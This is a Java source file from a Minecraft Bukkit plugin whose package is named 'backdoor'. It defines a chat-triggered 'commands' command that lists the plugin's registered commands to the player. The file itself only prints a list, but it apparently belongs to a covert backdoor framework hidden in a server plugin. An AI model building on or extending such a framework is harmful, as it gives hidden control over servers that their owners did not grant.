package me.kmatias.backdoor.commands;

import me.kmatias.backdoor.Command;
import me.kmatias.backdoor.RegisterCommand;
import me.kmatias.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "commands", aliases = {"commands"})
public class CommandsCommand extends Command {

    private final Main main;

    public CommandsCommand(Main main) {
        this.main = main;
    }

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        StringBuilder sb = new StringBuilder();
        sb.append("commands: ");

        for (Command c : main.getCommandManager().getCommands()) {
            sb.append(c.getDisplayName());
            sb.append(", ");
        }
        sb.delete(sb.length() - 2, sb.length());

        event.getPlayer().sendMessage(sb.toString());
    }
}
